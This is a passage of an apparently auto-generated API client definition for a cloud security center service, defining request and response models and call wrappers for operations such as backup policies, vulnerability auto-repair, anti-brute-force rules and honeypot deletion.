  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.similarEventScenarioCode)) {
    query['SimilarEventScenarioCode'] = request.similarEventScenarioCode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSimilarSecurityEventsQueryTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSimilarSecurityEventsQueryTask(request: CreateSimilarSecurityEventsQueryTaskRequest): CreateSimilarSecurityEventsQueryTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSimilarSecurityEventsQueryTaskWithOptions(request, runtime);
}

model CreateSuspEventNoteRequest {
  eventId?: long(name='EventId', description='The ID of the alert event to which you want to add remarks. You can call the [DescribeSuspEvents](~~251497~~) operation to query the IDs of alert events.', example='668931'),
  note?: string(name='Note', description='The remarks that you want to add.', example='Ignore'),
}

model CreateSuspEventNoteResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model CreateSuspEventNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSuspEventNoteResponseBody(name='body'),
}

async function createSuspEventNoteWithOptions(request: CreateSuspEventNoteRequest, runtime: Util.RuntimeOptions): CreateSuspEventNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSuspEventNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSuspEventNote(request: CreateSuspEventNoteRequest): CreateSuspEventNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSuspEventNoteWithOptions(request, runtime);
}

model CreateUniBackupPolicyRequest {
  accountName?: string(name='AccountName', example='admin'),
  accountPassword?: string(name='AccountPassword', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', example='true'),
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  fullPlan?: map[string]any(name='FullPlan'),
  incPlan?: map[string]any(name='IncPlan'),
  instanceId?: string(name='InstanceId', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', example='mysql-policy'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='5242880'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
  uuid?: string(name='Uuid', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', example='admin'),
  accountPassword?: string(name='AccountPassword', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', example='true'),
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  fullPlanShrink?: string(name='FullPlan'),
  incPlanShrink?: string(name='IncPlan'),
  instanceId?: string(name='InstanceId', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', example='mysql-policy'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='5242880'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
  uuid?: string(name='Uuid', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='2FAEB7D0-C0B9-581C-877A-F80F50AA****'),
}

model CreateUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniBackupPolicyResponseBody(name='body'),
}

async function createUniBackupPolicyWithOptions(tmpReq: CreateUniBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.databaseAddByUser)) {
    query['DatabaseAddByUser'] = request.databaseAddByUser;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniBackupPolicy(request: CreateUniBackupPolicyRequest): CreateUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniBackupPolicyWithOptions(request, runtime);
}

model CreateUniRestorePlanRequest {
  database?: string(name='Database', example='qtc'),
  instanceUuid?: string(name='InstanceUuid', example='ac457b30598d11ed800000163e02****'),
  policyId?: long(name='PolicyId', example='123'),
  resetScn?: string(name='ResetScn', example='925702.0'),
  resetTime?: string(name='ResetTime', example='2022-10-29 01:06:24'),
  restoreInfo?: string(name='RestoreInfo', example='{"files": {"qtc":"F:\\\\database\\\\qtc.mdf","qtc_log":"F:\\\\database\\\\qtc_0.ldf"},
"name":"qtc"}'),
  timePoint?: long(name='TimePoint', example='1656957664000'),
}

model CreateUniRestorePlanResponseBody = {
  requestId?: string(name='RequestId', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model CreateUniRestorePlanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniRestorePlanResponseBody(name='body'),
}

async function createUniRestorePlanWithOptions(request: CreateUniRestorePlanRequest, runtime: Util.RuntimeOptions): CreateUniRestorePlanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.resetScn)) {
    query['ResetScn'] = request.resetScn;
  }
  if (!Util.isUnset(request.resetTime)) {
    query['ResetTime'] = request.resetTime;
  }
  if (!Util.isUnset(request.restoreInfo)) {
    query['RestoreInfo'] = request.restoreInfo;
  }
  if (!Util.isUnset(request.timePoint)) {
    query['TimePoint'] = request.timePoint;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniRestorePlan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniRestorePlan(request: CreateUniRestorePlanRequest): CreateUniRestorePlanResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniRestorePlanWithOptions(request, runtime);
}

model CreateVulAutoRepairConfigRequest {
  reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='TestAutoRepair'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values: 
- **cve**: Linux software vulnerability. 
- **sys**: Windows system vulnerability.', example='cve'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25032:zlib 1.2.11 memory corruption'),
      name?: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
    }
  ](name='VulAutoRepairConfigList', description='The vulnerabilities that can be automatically fixed.'),
}

model CreateVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model CreateVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateVulAutoRepairConfigResponseBody(name='body'),
}

async function createVulAutoRepairConfigWithOptions(request: CreateVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): CreateVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vulAutoRepairConfigList)) {
    query['VulAutoRepairConfigList'] = request.vulAutoRepairConfigList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createVulAutoRepairConfig(request: CreateVulAutoRepairConfigRequest): CreateVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createVulAutoRepairConfigWithOptions(request, runtime);
}

model DeleteAntiBruteForceRuleRequest {
  ids?: [ long ](name='Ids', description='An array that consists of the IDs of the defense rules against brute-force attacks to delete.'),
}

model DeleteAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model DeleteAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteAntiBruteForceRuleResponseBody(name='body'),
}

async function deleteAntiBruteForceRuleWithOptions(request: DeleteAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): DeleteAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteAntiBruteForceRule(request: DeleteAntiBruteForceRuleRequest): DeleteAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAntiBruteForceRuleWithOptions(request, runtime);
}

model DeleteBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy that you want to delete.', example='12'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy that you want to delete. You can call the [DescribeBackupPolicies](~~322795~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
}

model DeleteBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyResponseBody(name='body'),
}

async function deleteBackupPolicyWithOptions(request: DeleteBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicy(request: DeleteBackupPolicyRequest): DeleteBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyWithOptions(request, runtime);
}

model DeleteBackupPolicyMachineRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.
>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the **Id** of anti-ransomware policies.', example='11'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.

>  You must specify at least one of the `UuidList` and `Uuid` parameters.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.

>  You must specify at least one of the `UuidList` and `Uuid` parameters.'),
}

model DeleteBackupPolicyMachineResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DeleteBackupPolicyMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyMachineResponseBody(name='body'),
}

async function deleteBackupPolicyMachineWithOptions(request: DeleteBackupPolicyMachineRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicyMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicyMachine(request: DeleteBackupPolicyMachineRequest): DeleteBackupPolicyMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyMachineWithOptions(request, runtime);
}

model DeleteClientUserDefineRuleRequest {
  idList?: [ long ](name='IdList'),
}

model DeleteClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='4552b59b-18f2-4fad-b6a2-0d59b8f2****'),
}

model DeleteClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteClientUserDefineRuleResponseBody(name='body'),
}

async function deleteClientUserDefineRuleWithOptions(request: DeleteClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): DeleteClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteClientUserDefineRule(request: DeleteClientUserDefineRuleRequest): DeleteClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteClientUserDefineRuleWithOptions(request, runtime);
}

model DeleteCustomBlockRecordRequest {
  id?: long(name='Id', example='381**'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DeleteCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCustomBlockRecordResponseBody(name='body'),
}

async function deleteCustomBlockRecordWithOptions(request: DeleteCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DeleteCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCustomBlockRecord(request: DeleteCustomBlockRecordRequest): DeleteCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomBlockRecordWithOptions(request, runtime);
}

model DeleteCycleTaskRequest {
  configId?: string(name='ConfigId', example='435f626256ebf564cf5ba966a539****'),
}

model DeleteCycleTaskResponseBody = {
  requestId?: string(name='RequestId', example='7DBB3D54-AF29-5BF4-8B44-9CFA94F50****'),
}

model DeleteCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCycleTaskResponseBody(name='body'),
}

async function deleteCycleTaskWithOptions(request: DeleteCycleTaskRequest, runtime: Util.RuntimeOptions): DeleteCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCycleTask(request: DeleteCycleTaskRequest): DeleteCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCycleTaskWithOptions(request, runtime);
}

model DeleteGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the server group that you want to delete.

>  To delete a server group, you must provide the ID of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the ID.', example='9454789'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX'),
}

model DeleteGroupResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteGroupResponseBody(name='body'),
}

/**
  * The **Default** server group that is provided by Security Center cannot be deleted. After you delete a group, the assets in this group are moved to the **Default** group.
  *
  * @param request DeleteGroupRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DeleteGroupResponse
 */
async function deleteGroupWithOptions(request: DeleteGroupRequest, runtime: Util.RuntimeOptions): DeleteGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The **Default** server group that is provided by Security Center cannot be deleted. After you delete a group, the assets in this group are moved to the **Default** group.
  *
  * @param request DeleteGroupRequest
  * @return DeleteGroupResponse
 */
async function deleteGroup(request: DeleteGroupRequest): DeleteGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteGroupWithOptions(request, runtime);
}

model DeleteHoneypotRequest {
  honeypotId?: string(name='HoneypotId', example='558b5fa40948ebe2171a74757c54dc7e58f761870fa7ee6a105e70947ec82aa9'),
}

model DeleteHoneypotResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DeleteHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotResponseBody(name='body'),
}

async function deleteHoneypotWithOptions(request: DeleteHoneypotRequest, runtime: Util.RuntimeOptions): DeleteHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypot(request: DeleteHoneypotRequest): DeleteHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotWithOptions(request, runtime);
}

model DeleteHoneypotNodeRequest {
  nodeId?: string(name='NodeId', example='670baeee-86c4-46b9-8200-a2c38141a453'),
}

model DeleteHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DeleteHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotNodeResponseBody(name='body'),
}

async function deleteHoneypotNodeWithOptions(request: DeleteHoneypotNodeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotNode(request: DeleteHoneypotNodeRequest): DeleteHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotNodeWithOptions(request, runtime);
}

model DeleteHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', example='84104b7b-a2bc-41df-a190-12298f99f1ed'),
}

model DeleteHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DeleteHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotPresetResponseBody(name='body'),
}

async function deleteHoneypotPresetWithOptions(request: DeleteHoneypotPresetRequest, runtime: Util.RuntimeOptions): DeleteHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotPreset(request: DeleteHoneypotPresetRequest): DeleteHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotPresetWithOptions(request, runtime);
}

model DeleteHoneypotProbeRequest {
  probeId?: string(name='ProbeId', example='95f0f79c-f7e9-4b09-a6e3-95a4cb6d****'),
}

model DeleteHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
  success?: boolean(name='Success', example='true'),
}

model DeleteHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotProbeResponseBody(name='body'),
}

async function deleteHoneypotProbeWithOptions(request: DeleteHoneypotProbeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotProbe(request: DeleteHoneypotProbeRequest): DeleteHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotProbeWithOptions(request, runtime);
}

model DeleteInstallCodeRequest {
  captchaCode?: string(name='CaptchaCode', example='1q****'),
}

model DeleteInstallCodeResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DeleteInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInstallCodeResponseBody(name='body'),
}

async function deleteInstallCodeWithOptions(request: DeleteInstallCodeRequest, runtime: Util.RuntimeOptions): DeleteInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.captchaCode)) {
    query['CaptchaCode'] = request.captchaCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInstallCode(request: DeleteInstallCodeRequest): DeleteInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInstallCodeWithOptions(request, runtime);
}

model DeleteInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', example='cdf629147cc3747d292a3f587xxxxxxxx'),
  ruleIds?: [ long ](name='RuleIds'),
}

model DeleteInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
